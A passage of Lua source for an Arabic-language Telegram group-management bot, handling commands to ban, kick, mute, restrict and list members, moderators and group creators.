chat_kick(msg.chat_id_, res[2])
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم ( حظره ) من المجموعه ', 1, 'md')
end end end
--     By Developer Faeder     -- 
if text:match("^طرد$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
function kick_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("faeder:lock:ban"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الطرد او الحظر \n↫ لانه معطل من قبل المنشئ . ', 1, 'md')
return "faeder"
end
if is_momod(result.sender_user_id_, result.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع طرد '..faeder_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم طرده بنجاح𓍢\n")
chat_kick(result.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--     By Developer Faeder     -- 
if text and text:match("^طرد @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local faeder_res = {string.match(text, "^(طرد) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("faeder:lock:ban"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الطرد او الحظر \n↫ لانه معطل من قبل المنشئ . ', 1, 'md')
return "faeder"
end
if result.id_ then
if is_momod(result.id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع طرد '..faeder_renk(result.id_, msg.chat_id_), 1, 'md')
else
Send_Options(msg,result.id_,"reply","\n↫ تم طرده بنجاح𓍢\n")
chat_kick(msg.chat_id_, result.id_)
end end end
resolve_username(faeder_res[2],ban_by_username)
end
--     By Developer Faeder     -- 
if text:match("^طرد (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(طرد) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("faeder:lock:ban"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الطرد او الحظر \n↫ لانه معطل من قبل المنشئ . ', 1, 'md')
return "faeder"
end
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
if is_momod(res[2], msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع طرد '..faeder_renk(res[2], msg.chat_id_), 1, 'md')
else
chat_kick(msg.chat_id_, res[2])
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم ( طرده ) من المجموعه ', 1, 'md')
end end end
--     By Developer Faeder     -- 
if text:match("^الغاء حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
function faeder(extra, result, success)
function unban_by_reply(extra, result, success)
local faeder = 'bot:banned:'..msg.chat_id_
if not faederdx1:sismember(FAEDER..faeder, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","\n↫ لم يتم حظره سابقا𓍢\n")
else  
faederdx1:srem(FAEDER..faeder, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم الغاء حظره𓍢\n")
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
channel_get_kicked(msg.chat_id_,faeder)
end 
--     By Developer Faeder     -- 
if text:match("^الغاء حظر @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء حظر) @(.*)$")}
function unban_by_username(extra, result, success)
if result.id_ then
if not faederdx1:sismember(FAEDER..'bot:banned:'..msg.chat_id_, result.id_) then
Send_Options(msg,result.id_,"reply","\n↫ لم يتم حظره سابقا𓍢\n")
else 
faederdx1:srem(FAEDER..'bot:banned:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)
Send_Options(msg,result.id_,"reply","\n↫ تم الغاء حظره𓍢\n")
end else 
text = '↫ *المعرف غير صحيح*'
end
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
resolve_username(res[2],unban_by_username)
end
--     By Developer Faeder     -- 
if text:match("^الغاء حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء حظر) (%d+)$")}
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
if not faederdx1:sismember(FAEDER..'bot:banned:'..msg.chat_id_, res[2]) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *لم يتم ( حظره ) سابقا*', 1, 'md')
else 
faederdx1:srem(FAEDER..'bot:banned:'..msg.chat_id_, res[2])
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = res[2] , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
faederdx(msg.chat_id_, msg.id_, 1, '↫ *المحظور* ( ['..faeder_res..'] )\n↫ *تم ( الغاء حظره ) ', 1, 'md')
end end end
--     By Developer Faeder     -- 
if text:match("^حظر عام$") and is_sudo(msg) and msg.reply_to_message_id_ and faeder11(msg) then
function gban_by_reply(extra, result, success)
local gps = faederdx1:scard(FAEDER.."bot:groups")
local faeder = 'bot:gban:'
if is_leaderid(result.sender_user_id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ *لا تستطيع حظر Devil  ", 1, 'md')
return false 
end
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم حظره من "..gps.." مجموعه𓍢\n")
faederdx1:sadd(FAEDER..faeder, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
--     By Developer Faeder     -- 
if text and text:match("^حظر عام @(.*)$") and is_sudo(msg) and faeder11(msg) then
local faeder_res = {string.match(text, "^(حظر عام) @(.*)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
function gban_by_username(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ *لا تستطيع حظر Devil  ", 1, 'md')
return false 
end
Send_Options(msg,result.id_,"reply","\n↫ تم حظره من "..gps.." مجموعه𓍢\n")
faederdx1:sadd(FAEDER..'bot:gban:', result.id_)
chat_kick(msg.chat_id_, result.id_)
end end
resolve_username(faeder_res[2],gban_by_username)
end
--     By Developer Faeder     -- 
if text:match("^حظر عام (%d+)$") and is_sudo(msg) and faeder11(msg) then
local res = {string.match(text, "^(حظر عام) (%d+)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder = 'bot:gban:'
local faeder_res = user_info_ if user_info_ then
if is_leaderid(res[2]) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ *لا تستطيع حظر Devil  ", 1, 'md')
return false 
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
faederdx1:sadd(FAEDER..faeder, res[2])
chat_kick(msg.chat_id_, res[2])
end
--     By Developer Faeder     -- 
if text:match("^الغاء العام$") and is_sudo(msg) and msg.reply_to_message_id_ and faeder11(msg) then
function ungban_by_reply(extra, result, success)
local gps = faederdx1:scard(FAEDER.."bot:groups")
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_ if user_info_ then
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم الغاء حظره كتمه من "..gps.." مجموعه𓍢\n")
end
faederdx1:srem(FAEDER..'bot:gban:', result.sender_user_id_)
faederdx1:srem(FAEDER..'bot:mutedall:', result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end
--     By Developer Faeder     -- 
if text:match("^الغاء العام @(.*)$") and is_sudo(msg) and faeder11(msg) then
local faeder_res = {string.match(text, "^(الغاء العام) @(.*)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
function ungban_by_username(extra, result, success)
if result.id_ then
Send_Options(msg,result.id_,"reply","\n↫ تم الغاء حظره كتمه من "..gps.." مجموعه𓍢\n")
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)
faederdx1:srem(FAEDER..'bot:gban:', result.id_)
faederdx1:srem(FAEDER..'bot:mutedall:', result.id_)
end end 
resolve_username(faeder_res[2],ungban_by_username)
end
--     By Developer Faeder     -- 
if text:match("^الغاء العام (%d+)$") and is_sudo(msg) and faeder11(msg) then
local res = {string.match(text, "^(الغاء العام) (%d+)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم الغاء حظره كتمه من ( '..gps..' ) مجموعه*', 1, 'md')
faederdx1:srem(FAEDER..'bot:gban:', res[2])
faederdx1:srem(FAEDER..'bot:mutedall:', res[2])
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = ap[2] , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end end
--     By Developer Faeder     -- 
if text:match("^كتم عام$") and is_sudo(msg) and msg.reply_to_message_id_ and faeder11(msg) then
function muteall_by_reply(extra, result, success)
local gps = faederdx1:scard(FAEDER.."bot:groups")
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, '•*لا تستطيع كتمي*', 1, 'md')
return false 
end 
if is_leaderid(result.sender_user_id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ *لا تستطيع كتم Devil  ", 1, 'md')
return false 
end
faederdx1:sadd(FAEDER..'bot:mutedall:', result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم كتمه في "..gps.." مجموعه𓍢\n")
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,muteall_by_reply)
end
--     By Developer Faeder     -- 
if text and text:match("^كتم عام @(.*)$") and is_sudo(msg) and faeder11(msg) then
local faeder_res = {string.match(text, "^(كتم عام) @(.*)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
function muteall_by_username(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ *لا تستطيع كتم Devil  ", 1, 'md')
return false 
end
Send_Options(msg,result.id_,"reply","\n↫ تم كتمه في "..gps.." مجموعه𓍢\n")
faederdx1:sadd(FAEDER..'bot:mutedall:', result.id_)
end end
resolve_username(faeder_res[2],muteall_by_username)
end
--     By Developer Faeder     -- 
if text:match("^كتم عام (%d+)$") and is_sudo(msg) and faeder11(msg) then
local res = {string.match(text, "^(كتم عام) (%d+)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
if is_leaderid(res[2]) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ *لا تستطيع كتم Devil  ", 1, 'md')
return false 
end
faederdx1:sadd(FAEDER..'bot:mutedall:', res[2])
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم كتمه في ( '..gps..' ) مجموعه*', 1, 'md')
end end
--     By Developer Faeder     -- 
if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
function mute_by_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("FAEDER:lock:banmu"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الكتم او التقييد \n↫ لانه معطل من قبل المنشئ ', 1, 'md')
return "faeder"
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ *لا تستطيع كتمي*', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتم '..faeder_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
faederdx1:sadd(FAEDER..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم  كتمه𓍢\n")
end end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     By Developer Faeder     -- 
if text:match('^كتم @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local faeder_res = {string.match(text, '^(كتم) @(.*)$')}
function mute_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("FAEDER:lock:banmu"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الكتم او التقييد \n↫ لانه معطل من قبل المنشئ ', 1, 'md')
return "faeder"
end
local faeder = 'bot:muted:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتم '..faeder_renk(result.id_, msg.chat_id_), 1, 'md')
else
if faederdx1:sismember(FAEDER..faeder, result.id_) then
Send_Options(msg,result.id_,"reply","\n↫ تم كتمه سابقا𓍢\n")
else
faederdx1:sadd(FAEDER..faeder, result.id_)
Send_Options(msg,result.id_,"reply","\n↫ تم كتمه بنجاح𓍢\n")
end end end end
resolve_username(faeder_res[2],mute_by_username)
end
--     By Developer Faeder     -- 
if text:match("^كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(كتم) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("FAEDER:lock:banmu"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الكتم او التقييد \n↫ لانه معطل من قبل المنشئ ', 1, 'md')
return "faeder"
end
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
if is_momod(res[2], msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتم '..faeder_renk(res[2], msg.chat_id_), 1, 'md')
else
if faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_, res[2]) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم  ( كتمه ) سابقا ', 1, 'md')
end
faederdx1:sadd(FAEDER..'bot:muted:'..msg.chat_id_, res[2])
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم  ( كتمه ) ', 1, 'md')
end end end
--     By Developer Faeder     -- 
if text:match("^الغاء كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
function unmute_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder = 'bot:muted:'..msg.chat_id_
local faeder_res = user_info_ if user_info_ then
if not faederdx1:sismember(FAEDER..faeder, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","\n↫ لم يتم كتمه سابقا𓍢\n")
else
faederdx1:srem(FAEDER..faeder, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم الغاء كتمه𓍢\n")
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
--     By Developer Faeder     -- 
if text:match("^الغاء كتم @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء كتم) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.id_)
local faeder_res = user_info_ 
if result.id_ then
if not faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_, result.id_) then
Send_Options(msg,result.id_,"reply","\n↫ لم يتم كتمه سابقا𓍢\n")
else
Send_Options(msg,result.id_,"reply","\n↫ تم الغاء كتمه بنجاح𓍢\n")
faederdx1:srem(FAEDER..'bot:muted:'..msg.chat_id_, result.id_)
end end end
resolve_username(res[2],unmute_by_username)
end
--     By Developer Faeder     -- 
if text:match("^الغاء كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء كتم) (%d+)$")}
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
if not faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_, res[2]) then
Send_Options(msg,result.id_,"reply","\n↫ لم يتم كتمه سابقا𓍢\n")
else
faederdx1:srem(FAEDER..'bot:muted:'..msg.chat_id_, res[2])
Send_Options(msg,result.id_,"reply","\n↫ تم الغاء كتمه بنجاح𓍢\n")
end end end end
--     By Developer Faeder     -- 
if msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع حمار$") then
function donky_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
if is_leaderid(result.sender_user_id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ *دزمها مبرمج السورس ذا ماتقدر ترفعه او ترفع  Devil  والمبرمج ", 1, 'md')
return false 
end
local hash = 'bot:donky:'..msg.chat_id_
if faederdx1:sismember(FAEDER..hash, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","\n↫ هو حمار اصلا روق\n")
else
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم رفعه حمار 🐴\n")
end
faederdx1:sadd(FAEDER..hash, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     By Developer Faeder     -- 
if msg.reply_to_message_id_ ~= 0  then
if text:match("^تنزيل حمار$") then
function donky_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
local hash = 'bot:donky:'..msg.chat_id_
if not faederdx1:sismember(FAEDER..hash, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","\n↫ لم يتم رفعه حمار\n")
else
Send_Options(msg,result.sender_user_id_,"reply","\n↫ بيجلس حمار بس بنزله لعيونك\n")
faederdx1:srem(FAEDER..hash, result.sender_user_id_)
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text:match("^تقييد$") or text:match("^تقيد$") and faeder11(msg) then  
function mute_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫  تستطيع تقييدي ', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع تقييد '..faeder_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
faederdx1:sadd(FAEDER..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.id_,"reply","\n↫ تم تقييده بنجاح𓍢\n")
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     By Developer Faeder     -- 
if msg.reply_to_message_id_ ~= 0 then  
if text:match("^الغاء تقييد$") or text:match("^الغاء تقيد$") and faeder11(msg) then
function mute_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ هذا انا البوت ', 1, 'md')
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
faederdx1:srem(FAEDER..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.id_,"reply","\n↫ تم الغاء تقييده بنجاح𓍢\n")
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end end end
--     By Developer Faeder     -- 
if text and text:match('^كتم د (%d+)$') and faeder11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم د (%d+)$")}
local Minutes = string.gsub(mutept[1], 'm', '')
local num1 = tonumber(Minutes) * 60 
local num = tonumber(num1)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتم '..faeder_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم كتمه لمده ( '..mutept[1]..' ) دقيقه ', 1, 'md')
faederdx1:sadd(FAEDER..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end
--     By Developer Faeder     -- 
if text and text:match('^كتم س (%d+)$') and faeder11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم س (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600 
local num = tonumber(num1)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتم '..faeder_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم كتمه لمده ( '..mutept[1]..' ) ساعه ', 1, 'md')
faederdx1:sadd(FAEDER..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
--     By Developer Faeder     -- 
if text and text:match('^كتم ي (%d+)$') and faeder11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم ي (%d+)$")}
local day = string.gsub(mutept[1], 'd', '')
local num1 = tonumber(day) * 86400 
local num = tonumber(num1)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع كتم '..faeder_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم كتمه لمده ( '..mutept[1]..' ) يوم ', 1, 'md')
faederdx1:sadd(FAEDER..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
--     By Developer Faeder     -- 
if text == 'مسح المقيدين' and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then     
local hash =  'tkeed:'..msg.chat_id_
local list = faederdx1:smembers(FAEDER..hash)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
faederdx1:srem(FAEDER..'tkeed:'..msg.chat_id_, v)
end
faederdx(msg.chat_id_, msg.id_, 1,'↫ تم مسح المقيدين ', 1, 'md')
 end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تثبيت$") and faeder11(msg) then  
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
faederdx1:set(FAEDER..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
faederdx(msg.chat_id_, msg.id_, 1,'↫ تم تثبيت الرساله ', 1, 'md')
end end
--     By Developer Faeder     -- 
if text == ("المقيدين") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."tkeed:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد مقيدين ", "md")
end
tkeed = "↫ قائمه المقيدين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
tkeed = tkeed.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, tkeed, "md")
end end,nil) end end
--     By Developer Faeder     --  
if text == ("الادمنيه") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:momod:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد ادمنيه ", "md")
end
Admin = "↫ قائمه الادمنيه \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Admin = Admin.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, Admin, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("المنشئين") and is_monsh(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:monsh2:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد منشئين ", "md")
end
monsh = "↫ قائمه المنشئين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
monsh = monsh.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, monsh, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("الادمنيه العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:moall:")
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد ادمنيه عامين ", "md")
end
moall = "↫ قائمه الادمنيه العامين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
